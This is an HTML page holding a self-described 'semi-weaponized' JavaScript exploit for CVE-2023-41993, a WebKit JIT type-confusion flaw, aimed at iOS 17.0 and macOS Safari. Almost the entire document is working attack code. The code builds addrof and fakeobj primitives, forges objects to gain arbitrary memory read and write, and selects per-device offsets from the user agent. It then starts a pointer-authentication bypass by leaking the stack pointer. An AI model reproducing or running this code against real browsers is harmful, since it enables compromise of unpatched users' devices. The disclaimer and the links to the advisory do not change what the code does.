
<!DOCTYPE html>
<html>
<body>
<script src="./util.js"></script>
<script src="./int64.js"></script>
<script>

document.write("<h1>Exploit for CVE-2023-41993</h1>");

/*
semi-weaponized exploit for CVE-2023-41993
tested on iOS 17.0 Beta 2 on iPhone 14 Pro Max
Author: https://github.com/0x06060606
*** DO NOT USE THIS EXPLOIT FOR MALICIOUS PURPOSES ***
*/

/*
poc: https://github.com/po6ix/POC-for-CVE-2023-41993/tree/main
poc author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/

function send(ep, data) {
	var msg = {
		msg: data
	};
	var jsonstr = JSON.stringify(msg);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/json');
		xhr.send(jsonstr);
	} catch (e) {
        void(0);
	}
}

function log(msg) {
	send('log', msg === undefined ? 'undefined' : msg.toString());
    document.write("<h1>" + msg + "</h1>");
}

window.onerror = function (msg, url, line) {
	if (msg === 'Out of memory') { alert(msg); }
	send('error', [line, msg]);
	location.reload();
};

const ITERATIONS = 100000;

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function str2ab(str) {
    var array = new Uint8Array(str.length);
    for(var i = 0; i < str.length; i++) {
        array[i] = str.charCodeAt(i);
    }
    return array.buffer
}

let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};
let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;
let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}
let shapes = [];
for (let i = 0; i < 0x1000; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;
    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;
    function get_getterSetter(type) {
        let o, retval;
        if (type == 0) o = object_a;
        else o = object_b;
        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    return [getter, get_getterSetter(1)];
}

(function pwn() {
    log("Stage 1: Triggering CVE-2023-41993");
    for (let i = 0; i < 0x10; i++) {
        new ArrayBuffer(0x1000000)
    }
    var getter, getterSetter;
    for (let i = 1; i <= ITERATIONS; i++) {
        [getter, getterSetter] = trigger();
        try {
            getterSetter.toString();
        } catch(e) {
            break;
        }
    }
    if (getterSetter == undefined) {
        log("Failed to trigger getterSetter!");
        alert("Failed to trigger getterSetter!");
        location.reload();
        return;
    } else {
        log("Successfully triggered getterSetter!");
    }
    let symbolObject = Object(getterSetter);
    let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
    let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
    let buildNum = navigator.userAgent.split('Mobile/')[1].split(' ')[0];
    let version = null;
    if (isIphone)
        version = navigator.userAgent.split('iPhone OS ')[1].split(' ')[0];
    else if (isMac)
        version = navigator.userAgent.split('Mac OS X ')[1].split(' ')[0];
    else
        version = 'unknown';
    version = version.replace(/_/g, '.');
    let offsets = {};
    let unknown_device = false;
    if (isMac && buildNum == '15E148') {
        offsets.factor = 840;
        offsets.JS_GLOBAL_OBJ_TO_GLOBAL_OBJ = 24;
        offsets.GLOBAL_OBJ_TO_VM = 56;
        offsets.VM_TO_TOP_CALL_FRAME = 0x9ac0;
        offsets.JS_FUNCTION_TO_EXECUTABLE = 24;
        offsets.EXECUTABLE_TO_JITCODE = 8;
        offsets.JIT_CODE_TO_ENTRYPOINT = 0x148;
    } else if (isIphone && buildNum == '15E148' && version == '17.0') {
        offsets.factor = 87;
        offsets.JS_GLOBAL_OBJ_TO_GLOBAL_OBJ = 24;
        offsets.GLOBAL_OBJ_TO_VM = 56;
        // Find this offset e.g. by looking at JSC::VM::throwException in the JSC binary
        offsets.VM_TO_TOP_CALL_FRAME = 0x99c0;
        offsets.JS_FUNCTION_TO_EXECUTABLE = 24;
        offsets.EXECUTABLE_TO_JITCODE = 8;
        offsets.EXECUTABLE_TO_NATIVE_FUNC = 40;
        offsets.JIT_CODE_TO_ENTRYPOINT = 0x148;
        offsets.JSC_BASE_TO_SEGV_HANDLER = 0x3e8b00b0;
        offsets.JSC_BASE_TO_CATCH_EXCEPTION_RET_ADDR = 0x279f8;
        offsets.JSC_BASE_TO_MATH_EXP = 0xbb877c;
    } else {
        offsets.factor = 87 + Math.floor(Math.random() * 1000);
        offsets.JS_GLOBAL_OBJ_TO_GLOBAL_OBJ = 16;
        offsets.GLOBAL_OBJ_TO_VM = 56;
        offsets.VM_TO_TOP_CALL_FRAME = 0x9c00;
        offsets.JS_FUNCTION_TO_EXECUTABLE = 24;
        offsets.EXECUTABLE_TO_JITCODE = 8;
        offsets.JIT_CODE_TO_ENTRYPOINT = 0x148;
        unknown_device = true;
    }
    log("Device: " + (isMac ? "Mac" : "iPhone"));
    log("Version: " + version);
    log("Build number: " + buildNum);
    log("Factor: " + offsets.factor);
    let ref_arr = [];
    for (let i = 0; i < offsets.factor; ++i) {
        ref_arr.push(symbolObject.description);
    }
    getter.p13 = 1.1;
    let unboxed_arr = getter;
    function addrof(o) {
        boxed_arr[8] = o;
        var addr = Int64.fromDouble(unboxed_arr[0]);
        boxed_arr[8] = null;
        return addr;
    }
    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        var fake = boxed_arr[8];
        boxed_arr[8] = null;
        return fake;
    }
    function isVulnerable() {
        let base = addrof({});
        if (!isNaN(base)) {
            let base_fake = fakeobj(base);
            if (base_fake.__proto__ == Object.prototype) {
                let t = {b: 42};
                let a = addrof(t);
                if (fakeobj(addrof(t)) !== t) {
                    return false;
                } else {
                    log("Primitive type confusion achieved!");
                    return true;
                }
            }
        }
        return false;
    }
    if (isVulnerable()) {
        log("Stage 2: Building R/W primitives");
        function FrickPAC()
        {
            try {
                let noCoW = 13.37;
                let arr = [noCoW, 2.2, 3.3];
                let oobArr = [noCoW, 2.2, 3.3];
                let objArr = [{}, {}, {}];
                const buf = new ArrayBuffer(8);
                const f64 = new Float64Array(buf);
                const u32 = new Uint32Array(buf);
                function f2i(val) {
                    f64[0] = val;
                    return u32[1] * 0x100000000 + u32[0];
                }
                function i2f(val) {
                    let tmp = [];
                    tmp[0] = parseInt(val % 0x100000000);
                    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
                    u32.set(tmp);
                    return f64[0];
                }
                function i2obj(val) {
                    return i2f(val-0x02000000000000);
                }
                function LeakStructureID(obj) {
                    let container = {
                        cellHeader: i2obj(0x0108200700000000),
                        butterfly: obj
                    };
                    let fakeObjAddr = Add(addrof(container), 0x10);
                    let fakeObj = fakeobj(fakeObjAddr);
                    f64[0] = fakeObj[0];
                    let structureID = u32[0];
                    u32[1] = 0x01082307 - 0x20000;
                    container.cellHeader = f64[0];
                    return structureID;
                }
                var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
                log("Leaking structure ID...");
                let structureID = LeakStructureID(arrLeak);
                log("Structure ID: " + Int64.fromDouble(i2f(structureID)));
                var unboxed = [noCoW, 13.37, 13.37]; // ArrayWithDouble
                let boxed = [{}];
                let victim = [noCoW, 14.47, 15.57];
                victim.prop = 13.37;
                var unboxed_addr = addrof(unboxed);
                log("Unboxed array address: " + unboxed_addr);
                var boxed_addr = addrof(boxed);
                log("Boxed array address: " + boxed_addr);
                var victim_addr = addrof(victim);
                log("Victim array address: " + victim_addr);
                u32[0] = structureID;
                u32[1] = 0x01082407 - 0x20000;
                var outer = {
                    p0: f64[0],    // Structure ID and metadata
                    p1: victim,   // butterfly
                };
                var fake_addr = Add(addrof(outer), 0x10);
                log("Fake object address: " + fake_addr);
                driver = fakeobj(fake_addr);
                u32[0] = structureID;
                u32[1] = 0x01082407-0x20000; // Fake JSCell metadata
                outer.p0 = f64[0];
                var victim_butterfly = f2i(driver[1]);
                log("Victim butterfly: " + Int64.fromDouble(i2f(victim_butterfly)));
                u32[0] = structureID;
                u32[1] = 0x01082409 - 0x20000; // Fake JSCell metadata
                outer.p0 = f64[0];
                log("Creating shared butterfly...");
                driver[1] = unboxed;
                var shared_butterfly = victim[1];
                log("Shared butterfly: 0x" + f2i(shared_butterfly).toString(16));
                driver[1] = boxed;
                victim[1] = shared_butterfly;
                u32[0] = structureID;
                u32[1] = 0x01082407-0x20000; // Fake JSCell metadata
                outer.p0 = f64[0];
                driver[1] = i2f((victim_butterfly));
                log("Creating read/write primitives...");
                function newAddrof(obj) {
                    boxed[0] = obj;
                    return f2i(unboxed[0]);
                }
                function newFakeobj(addr) {
                    unboxed[0] = i2f(addr);
                    return boxed[0];            
                }
                var new_victim = [];
                new_victim.p0 = 0x1337;
                function victim_write(val) {
                    new_victim.p0 = val;
                }
                function victim_read() {
                    return new_victim.p0;
                }
                outer.p1 = new_victim;
                function read64(addr) {
                    driver[1] = i2f(addr+0x10);
                    return newAddrof(victim_read());
                }
                function v2read64(addr) {
                    let oldval = driver[1];
                    driver[1] = Add(addr, 0x10).asDouble();
                    let retval = addrof(victim_read());
                    driver[1] = oldval;
                    return retval;
                }
                function write64(addr, val) {
                    driver[1] = i2f(addr+0x10);
                    victim_write(val);
                }
                function v2write64(addr, val) {
                    addr = new Int64(addr);
                    val = new Int64(val);
                    let oldval = driver[1];
                    driver[1] = Add(addr, 0x10).asDouble();
                    victim_write(val.asDouble());
                    driver[1] = oldval;
                }
                function write(where, values) {
                    for (var i = 0; i < values.length; ++i) {
                        if (values[i] != 0)
                            write64(where + i*8, values[i])
                    }
                }
                function TestRW() {
                    var test = [];
                    test.p0 = 0x1337;
                    var test_addr = newAddrof(test);
                    var test_before = read64(test_addr);
                    write64(test_addr, new Int64('0000000001337').asDouble());
                    var test_after = read64(test_addr);
                    if (test_after.toString(16) == '2000000001337') {
                        var testv2 = [];
                        testv2.p0 = 0x1337;
                        var testv2_addr = addrof(testv2);
                        var testv2_before = v2read64(testv2_addr);
                        v2write64(testv2_addr, new Int64(0xd34db33f));
                        var testv2_after = v2read64(testv2_addr);
                        if (testv2_after.toString() == '0x00020000d34db33f') {
                            log("Read/write primitives achieved!");
                            return true;
                        } else {
                            log("Failed to achieve read/write primitives!");
                            alert("Failed to achieve read/write primitives!");
                            location.reload();
                            return false;
                        }
                    } else {
                        log("Failed to achieve read/write primitives!");
                        alert("Failed to achieve read/write primitives!");
                        location.reload();
                        return false;
                    }
                }
                if (TestRW()) {
                    log("Stage 3: Bypass PAC");
                    var stack_ptr_tries = 0;
                    function get_stack_ptr() {
                        stack_ptr_tries += 1;
                        let global = Function('return this')();
                        let js_glob_obj_addr = addrof(global);
                        if (stack_ptr_tries < 2)
                            log("JS global object address: " + js_glob_obj_addr.toString());
                        let glob_obj_addr = v2read64(Add(js_glob_obj_addr, offsets.JS_GLOBAL_OBJ_TO_GLOBAL_OBJ));
                        if (stack_ptr_tries < 2)
                            log("Global object address: " + glob_obj_addr.toString());
                        let vm_addr = v2read64(Add(glob_obj_addr, offsets.GLOBAL_OBJ_TO_VM));
                        if (stack_ptr_tries < 2)
                            log("VM address: " + vm_addr.toString());
                        if (vm_addr.asDouble() == 8e-323) {
                            log("Failed to get VM address, probably going to crash...");
                            write64(0x1, 0x41414141);
                            return;
                        }
                        let vm_top_call_frame_addr = Add(vm_addr, offsets.VM_TO_TOP_CALL_FRAME);
                        if (stack_ptr_tries < 2)
                            log("VM top call frame address: " + vm_top_call_frame_addr.toString());
                        let vm_top_call_frame_addr_dbl = vm_top_call_frame_addr.asDouble();
                        let stack_ptr = v2read64(vm_top_call_frame_addr);
                        return {stack_ptr, vm_top_call_frame_addr_dbl};
                    }
                    log("Getting stack pointer...");
                    let {stack_ptr, vm_top_call_frame_addr_dbl} = get_stack_ptr();
                    if (stack_ptr == null || vm_top_call_frame_addr_dbl == null) {
                        write64(0x1, 0x41414141);
                        return;
                    } else {
                        while (stack_ptr == 0) {
                            log("Failed to get stack pointer, probably going to crash...");
                            write64(0x1, 0x41414141);
                            let {stack_ptr, vm_top_call_frame_addr_dbl} = get_stack_ptr();
                        }
                        if (stack_ptr == 0) {
                            log("What the frick?!");
                            write64(0x1, 0xd34db33f);
                            return;
                        } else {
                            log("Top CallFrame (stack): " + stack_ptr.toString());
                            log("Got stack pointer after " + stack_ptr_tries + " tries!");
                            // Test
                        }
                    }
                }
            } catch(e) {
                alert(e);
                location.reload();
                return;
            }
        }
        FrickPAC();
    } else {
        log("Not vulnerable!");
        alert("Not vulnerable!");
        location.reload();
        return;
    }
})();

</script>
</body>
</html>